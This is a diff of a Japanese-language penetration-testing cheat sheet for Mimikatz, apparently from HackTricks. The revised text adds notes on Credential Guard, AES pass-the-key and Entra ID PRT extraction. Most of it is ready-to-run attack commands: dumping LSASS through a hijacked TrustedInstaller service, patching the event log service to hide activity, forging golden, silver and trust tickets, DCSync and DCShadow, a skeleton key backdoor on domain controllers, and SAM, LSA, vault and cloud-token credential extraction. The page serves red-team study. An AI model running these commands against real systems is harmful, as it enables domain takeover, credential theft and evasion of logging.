@@ -2,200 +2,230 @@
 
 {{#include ../../banners/hacktricks-training.md}}
 
-**このページは [adsecurity.org](https://adsecurity.org/?page_id=1821) のものに基づいています**。詳細については元のページを確認してください！
 
-## LM とメモリ内の平文
+**このページは [adsecurity.org](https://adsecurity.org/?page_id=1821) のものを基にしています**。詳細は元ページを確認してください！
 
-Windows 8.1 および Windows Server 2012 R2 以降、資格情報の盗難を防ぐための重要な対策が実施されています：
+## LM and Clear-Text in memory
 
-- **LM ハッシュと平文パスワード** はセキュリティを強化するためにメモリに保存されなくなりました。特定のレジストリ設定、_HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest "UseLogonCredential"_ を DWORD 値 `0` に設定してダイジェスト認証を無効にし、「平文」パスワードが LSASS にキャッシュされないようにする必要があります。
+Windows 8.1 および Windows Server 2012 R2 以降、credential theft への対策として重要な保護策が実装されています:
 
-- **LSA 保護** は、ローカル セキュリティ アuthority (LSA) プロセスを不正なメモリ読み取りやコード注入から保護するために導入されました。これは、LSASS を保護されたプロセスとしてマークすることによって実現されます。LSA 保護を有効にするには：
-1. _HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Lsa_ のレジストリを変更し、`RunAsPPL` を `dword:00000001` に設定します。
-2. このレジストリ変更を管理されたデバイス全体に強制するグループポリシーオブジェクト (GPO) を実装します。
+- **LM hashes と plain-text passwords** は、セキュリティ強化のため memory に保存されなくなりました。特定の registry 設定である _HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest "UseLogonCredential"_ を DWORD 値 `0` に設定して Digest Authentication を無効化することで、LSASS に "clear-text" passwords が cache されないようにします。
 
-これらの保護にもかかわらず、Mimikatz のようなツールは特定のドライバーを使用して LSA 保護を回避することができますが、そのような行動はイベントログに記録される可能性が高いです。
+- **LSA Protection** は、Local Security Authority (LSA) process を不正な memory reading と code injection から保護するために導入されました。これは LSASS を protected process としてマークすることで実現されます。LSA Protection を有効化するには:
+1. _HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Lsa_ の registry を変更し、`RunAsPPL` を `dword:00000001` に設定します。
+2. 管理対象デバイス全体にこの registry 変更を適用する Group Policy Object (GPO) を実装します。
 
-### SeDebugPrivilege 削除への対抗
+これらの保護策があっても、Mimikatz のような tools は特定の drivers を使って LSA Protection を回避できますが、そのような actions は event logs に記録される可能性が高いです。
 
-管理者は通常 SeDebugPrivilege を持っており、プログラムをデバッグすることができます。この特権は、不正なメモリダンプを防ぐために制限されることがあります。これは、攻撃者がメモリから資格情報を抽出するために使用する一般的な手法です。しかし、この特権が削除されても、TrustedInstaller アカウントはカスタマイズされたサービス構成を使用してメモリダンプを実行することができます：
+現代の workstations ではこの点がさらに重要です。なぜなら、**Credential Guard は多くの Windows 11 22H2+ および Windows Server 2025 の domain-joined, non-DC systems で default で有効**であり、さらに **LSASS-as-PPL は新規の Windows 11 22H2+ installs で default で有効**だからです。実際には、`sekurlsa::logonpasswords` で得られる情報は古い tradecraft が想定していたより少ないことが多く、operator はますます **offline minidumps**、**Kerberos key extraction (`sekurlsa::ekeys`)**、または **CloudAP/PRT-oriented modules** に pivot しています。保護側については [Windows credentials protections](credentials-protections.md) を確認してください。
+
+### Counteracting SeDebugPrivilege Removal
+
+Administrators は通常 SeDebugPrivilege を持っており、これによって programs を debug できます。この privilege は、攻撃者が memory から credentials を抽出するためによく使う unauthorized memory dumps を防ぐために制限できます。ただし、この privilege を削除しても、TrustedInstaller account は customized service configuration を使って memory dumps を実行できます:
 ```bash
 sc config TrustedInstaller binPath= "C:\\Users\\Public\\procdump64.exe -accepteula -ma lsass.exe C:\\Users\\Public\\lsass.dmp"
 sc start TrustedInstaller
 ```
-これにより、`lsass.exe` メモリをファイルにダンプし、別のシステムで分析して資格情報を抽出することができます：
+これにより、`lsass.exe` のメモリをファイルにダンプでき、後で別のシステムで分析して credentials を抽出できます:
 ```
 # privilege::debug
 # sekurlsa::minidump lsass.dmp
 # sekurlsa::logonpasswords
 ```
-## Mimikatz オプション
+## Mimikatz Options
 
-Mimikatz におけるイベントログの改ざんは、主に 2 つのアクションを含みます: イベントログのクリアと、新しいイベントのログ記録を防ぐためのイベントサービスのパッチ適用。以下は、これらのアクションを実行するためのコマンドです。
+Mimikatz における Event log tampering は、主に2つの操作で行われます。イベントログを消去することと、Event service にパッチを当てて新しいイベントの記録を防ぐことです。以下は、これらの操作を行うコマンドです:
 
-#### イベントログのクリア
+#### Clearing Event Logs
 
-- **コマンド**: このアクションは、イベントログを削除することを目的としており、悪意のある活動を追跡しにくくします。
-- Mimikatz は、コマンドラインを介してイベントログを直接クリアするための直接的なコマンドを標準のドキュメントには提供していません。ただし、イベントログの操作は通常、特定のログをクリアするために Mimikatz の外部でシステムツールやスクリプトを使用することを含みます（例: PowerShell や Windows Event Viewer を使用）。
+- **Command**: この操作は event logs を削除し、悪意のある活動を追跡しにくくすることを目的としています。
+- Mimikatz には、標準ドキュメント上で command line から event logs を直接消去するための直接的なコマンドはありません。ただし、event log の操作は通常、Mimikatz の外部で system tools や scripts を使って、特定の logs を消去します（例: PowerShell や Windows Event Viewer を使用）。
 
-#### 実験的機能: イベントサービスのパッチ適用
+#### Experimental Feature: Patching the Event Service
 
-- **コマンド**: `event::drop`
-- この実験的コマンドは、イベントログサービスの動作を変更するように設計されており、新しいイベントの記録を効果的に防ぎます。
-- 例: `mimikatz "privilege::debug" "event::drop" exit`
+- **Command**: `event::drop`
+- この experimental command は Event Logging Service の動作を変更し、実質的に新しい events が記録されるのを防ぐように設計されています。
+- Example: `mimikatz "privilege::debug" "event::drop" exit`
 
-- `privilege::debug` コマンドは、Mimikatz がシステムサービスを変更するために必要な特権で動作することを保証します。
-- 次に、`event::drop` コマンドがイベントログサービスにパッチを適用します。
+- `privilege::debug` command は、Mimikatz が system services を変更するために必要な privileges で動作することを保証します。
+- その後、`event::drop` command が Event Logging service に patch を当てます。
 
-### Kerberos チケット攻撃
+### Kerberos Ticket Attacks
 
-### ゴールデンチケットの作成
+以下の commands は、すばやい syntax の確認用です。[golden tickets](../active-directory-methodology/golden-ticket.md), [silver tickets](../active-directory-methodology/silver-ticket.md), [diamond tickets](../active-directory-methodology/diamond-ticket.md), および [over-pass-the-hash / pass-the-key](../active-directory-methodology/over-pass-the-hash-pass-the-key.md) の専用ページには、最新の AES/PAC/opsec に関する詳細が含まれています。
 
-ゴールデンチケットは、ドメイン全体へのアクセスのなりすましを可能にします。主なコマンドとパラメータ:
+### Golden Ticket Creation
 
-- コマンド: `kerberos::golden`
-- パラメータ:
+Golden Ticket は、ドメイン全体への access impersonation を可能にします。主要な command と parameters:
+
+- Command: `kerberos::golden`
+- Parameters:
 - `/domain`: ドメイン名。
-- `/sid`: ドメインのセキュリティ識別子 (SID)。
-- `/user`: なりすますユーザー名。
-- `/krbtgt`: ドメインの KDC サービスアカウントの NTLM ハッシュ。
-- `/ptt`: チケットをメモリに直接注入します。
-- `/ticket`: 後で使用するためにチケットを保存します。
+- `/sid`: ドメインの Security Identifier (SID)。
+- `/user`: impersonate する username。
+- `/krbtgt`: ドメインの KDC service account の NTLM hash。
+- `/ptt`: ticket を直接 memory に inject します。
+- `/ticket`: ticket を later use のために保存します。
 
-例:
+Example:
 ```bash
 mimikatz "kerberos::golden /user:admin /domain:example.com /sid:S-1-5-21-123456789-123456789-123456789 /krbtgt:ntlmhash /ptt" exit
 ```
 ### Silver Ticket Creation
 
-Silver Ticketsは特定のサービスへのアクセスを許可します。主なコマンドとパラメータ：
+Silver Ticket は特定のサービスへのアクセスを許可します。主要なコマンドとパラメータ:
 
-- コマンド：Golden Ticketに似ていますが、特定のサービスをターゲットにします。
-- パラメータ：
-- `/service`：ターゲットとするサービス（例：cifs、http）。
-- その他のパラメータはGolden Ticketに似ています。
+- Command: Golden Ticket と同様だが、特定のサービスを対象にする。
+- Parameters:
+- `/service`: 対象とするサービス（例: cifs, http）。
+- 他のパラメータは Golden Ticket と同様。
 
-例：
+Example:
 ```bash
 mimikatz "kerberos::golden /user:user /domain:example.com /sid:S-1-5-21-123456789-123456789-123456789 /target:service.example.com /service:cifs /rc4:ntlmhash /ptt" exit
 ```
-### トラストチケットの作成
+### Trust Ticket の作成
 
-トラストチケットは、信頼関係を利用してドメイン間でリソースにアクセスするために使用されます。主なコマンドとパラメータ：
+Trust Ticket は、信頼関係を利用してドメインをまたいでリソースへアクセスするために使われます。主なコマンドとパラメータ:
 
-- コマンド：ゴールデンチケットに似ていますが、信頼関係用です。
-- パラメータ：
-- `/target`: ターゲットドメインのFQDN。
-- `/rc4`: トラストアカウントのNTLMハッシュ。
+- Command: Golden Ticket に似ていますが、trust relationships 用です。
+- Parameters:
+- `/target`: 対象ドメインの FQDN。
+- `/rc4`: trust account の NTLM hash。
 
-例：
+Example:
 ```bash
 mimikatz "kerberos::golden /domain:child.example.com /sid:S-1-5-21-123456789-123456789-123456789 /sids:S-1-5-21-987654321-987654321-987654321-519 /rc4:ntlmhash /user:admin /service:krbtgt /target:parent.example.com /ptt" exit
 ```
-### 追加のKerberosコマンド
+### Additional Kerberos Commands
 
-- **チケットのリスト**:
+- **Listing Tickets**:
 
-- コマンド: `kerberos::list`
-- 現在のユーザーセッションのすべてのKerberosチケットをリストします。
+- Command: `kerberos::list`
+- 現在のユーザーセッションのすべてのKerberosチケットを一覧表示します。
 
-- **キャッシュを渡す**:
+- **Pass the Cache**:
 
-- コマンド: `kerberos::ptc`
+- Command: `kerberos::ptc`
 - キャッシュファイルからKerberosチケットを注入します。
-- 例: `mimikatz "kerberos::ptc /ticket:ticket.kirbi" exit`
+- Example: `mimikatz "kerberos::ptc /ticket:ticket.kirbi" exit`
 
-- **チケットを渡す**:
+- **Pass the Ticket**:
 
-- コマンド: `kerberos::ptt`
+- Command: `kerberos::ptt`
 - 別のセッションでKerberosチケットを使用できるようにします。
-- 例: `mimikatz "kerberos::ptt /ticket:ticket.kirbi" exit`
+- Example: `mimikatz "kerberos::ptt /ticket:ticket.kirbi" exit`
 
-- **チケットを消去**:
-- コマンド: `kerberos::purge`
-- セッションからすべてのKerberosチケットをクリアします。
-- チケット操作コマンドを使用する前に、競合を避けるために便利です。
+- **Purge Tickets**:
+- Command: `kerberos::purge`
+- セッションからすべてのKerberosチケットを消去します。
+- チケット操作コマンドを使う前に、競合を避けるために有用です。
 
-### Active Directoryの改ざん
+### Over-Pass-the-Hash / Pass-the-Key
 
-- **DCShadow**: ADオブジェクト操作のために一時的にマシンをDCとして機能させます。
+`RC4` が無効化されているか信頼性が低い場合、Mimikatz は NT hash だけを使うのではなく、現在のログオンセッションに **AES128/AES256 Kerberos keys** をパッチできます。これは通常、`sekurlsa::pth` を NTLM 専用として扱うよりも、現代的なドメインに適しています。
+```bash
+mimikatz "privilege::debug" "sekurlsa::ekeys" exit
+mimikatz "sekurlsa::pth /user:svc_sql /domain:corp.local /aes256:<AES256_HEX> /run:powershell.exe" exit
+mimikatz "sekurlsa::pth /user:administrator /domain:corp.local /ntlm:<NT_HASH> /impersonate" exit
+```
+`/impersonate` は新しいコンソールを起動せずに現在のプロセスを再利用するため、同じコンテキストで `lsadump::dcsync` のようなものをすぐ実行したいときに便利です。
+
+### Active Directory Tampering
+
+- **DCShadow**: 一時的にマシンを DC として動作させ、AD オブジェクトを操作する。See [DCShadow](../active-directory-methodology/dcshadow.md).
 
 - `mimikatz "lsadump::dcshadow /object:targetObject /attribute:attributeName /value:newValue" exit`
 
-- **DCSync**: DCを模倣してパスワードデータを要求します。
+- **DCSync**: DC を模倣して password data を要求する。See [DCSync](../active-directory-methodology/dcsync.md).
 - `mimikatz "lsadump::dcsync /user:targetUser /domain:targetDomain" exit`
 
-### 認証情報アクセス
+### Credential Access
 
-- **LSADUMP::LSA**: LSAから認証情報を抽出します。
+- **LSADUMP::LSA**: LSA から credentials を抽出する。
 
 - `mimikatz "lsadump::lsa /inject" exit`
 
-- **LSADUMP::NetSync**: コンピュータアカウントのパスワードデータを使用してDCを偽装します。
+- **LSADUMP::NetSync**: computer account の password data を使って DC を impersonate する。
 
-- _元の文脈ではNetSyncのための特定のコマンドは提供されていません。_
+- _No specific command provided for NetSync in original context._
 
-- **LSADUMP::SAM**: ローカルSAMデータベースにアクセスします。
+- **LSADUMP::SAM**: ローカル SAM database にアクセスする。
 
 - `mimikatz "lsadump::sam" exit`
 
-- **LSADUMP::Secrets**: レジストリに保存された秘密を復号化します。
+- **LSADUMP::Secrets**: registry に保存された secrets を復号する。
 
 - `mimikatz "lsadump::secrets" exit`
 
-- **LSADUMP::SetNTLM**: ユーザーの新しいNTLMハッシュを設定します。
+- **LSADUMP::SetNTLM**: ユーザーに新しい NTLM hash を設定する。
 
 - `mimikatz "lsadump::setntlm /user:targetUser /ntlm:newNtlmHash" exit`
 
-- **LSADUMP::Trust**: 信頼認証情報を取得します。
+- **LSADUMP::Trust**: trust authentication information を取得する。
 - `mimikatz "lsadump::trust" exit`
 
-### その他
+### Cloud credentials / Entra ID
 
-- **MISC::Skeleton**: DCのLSASSにバックドアを注入します。
+**Entra ID** または **hybrid-joined** のホストでは、`sekurlsa::cloudap` により LSASS からキャッシュされた **Primary Refresh Token (PRT)** の material を公開できる。関連する Proof-of-Possession key が software-protected の場合、`dpapi::cloudapkd` により、後続の **Pass-the-PRT** ワークフローに必要な clear/derived key material を導出できる。
+```bash
+mimikatz "privilege::debug" "sekurlsa::cloudap" exit
+mimikatz "dpapi::cloudapkd /keyvalue:<ProofOfPossessionKey> /unprotect" exit
+mimikatz "dpapi::cloudapkd /context:<CONTEXT> /derivedkey:<DERIVED_KEY> /prt:<PRT>" exit
+```
+これは、key が TPM-backed の場合にはかなり難しくなりますが、hybrid endpoints では確認する価値があります。なぜなら、cached CloudAP data のほうが classic `wdigest` output より興味深い可能性があるからです。cloud-side abuse chain については、[Pass the PRT](https://cloud.hacktricks.wiki/en/pentesting-cloud/azure-security/az-lateral-movement-cloud-on-prem/pass-the-prt.html) を参照してください。
+
+### Miscellaneous
+
+- **MISC::Skeleton**: DC の LSASS に backdoor を inject します。
 - `mimikatz "privilege::debug" "misc::skeleton" exit`
 
-### 権限昇格
+### Privilege Escalation
 
-- **PRIVILEGE::Backup**: バックアップ権限を取得します。
+- **PRIVILEGE::Backup**: backup rights を取得します。
 
 - `mimikatz "privilege::backup" exit`
 
-- **PRIVILEGE::Debug**: デバッグ権限を取得します。
+- **PRIVILEGE::Debug**: debug privileges を取得します。
 - `mimikatz "privilege::debug" exit`
 
-### 認証情報ダンプ
+### Credential Dumping
 
-- **SEKURLSA::LogonPasswords**: ログオン中のユーザーの認証情報を表示します。
+- **SEKURLSA::LogonPasswords**: ログオン中ユーザーの credentials を表示します。
 
 - `mimikatz "sekurlsa::logonpasswords" exit`
 
-- **SEKURLSA::Tickets**: メモリからKerberosチケットを抽出します。
+- **SEKURLSA::Tickets**: メモリから Kerberos tickets を抽出します。
 - `mimikatz "sekurlsa::tickets /export" exit`
 
-### SIDとトークンの操作
+### Sid and Token Manipulation
 
-- **SID::add/modify**: SIDとSIDHistoryを変更します。
+- **SID::add/modify**: SID と SIDHistory を変更します。
 
-- 追加: `mimikatz "sid::add /user:targetUser /sid:newSid" exit`
-- 修正: _元の文脈では修正のための特定のコマンドは提供されていません。_
+- Add: `mimikatz "sid::add /user:targetUser /sid:newSid" exit`
+- Modify: _オリジナルの文脈では modify 用の具体的な command はありません。_
 
-- **TOKEN::Elevate**: トークンを偽装します。
+- **TOKEN::Elevate**: tokens を impersonate します。
 - `mimikatz "token::elevate /domainadmin" exit`
 
-### ターミナルサービス
+### Terminal Services
 
-- **TS::MultiRDP**: 複数のRDPセッションを許可します。
+- **TS::MultiRDP**: 複数の RDP sessions を許可します。
 
 - `mimikatz "ts::multirdp" exit`
 
-- **TS::Sessions**: TS/RDPセッションをリストします。
-- _元の文脈ではTS::Sessionsのための特定のコマンドは提供されていません。_
+- **TS::Sessions**: TS/RDP sessions を一覧表示します。
+- _オリジナルの文脈では TS::Sessions 用の具体的な command はありません。_
 
-### ボールト
+### Vault
 
-- Windows Vaultからパスワードを抽出します。
+- Windows Vault から passwords を抽出します。
 - `mimikatz "vault::cred /patch" exit`
 
+
+## References
+
+- [The Hacker Tools – Mimikatz modules](https://tools.thehacker.recipes/mimikatz/modules/)
+- [Synacktiv – WHFB and Entra ID: Say Hello to your new cache flow](https://www.synacktiv.com/en/publications/whfb-and-entra-id-say-hello-to-your-new-cache-flow)
 
 {{#include ../../banners/hacktricks-training.md}}
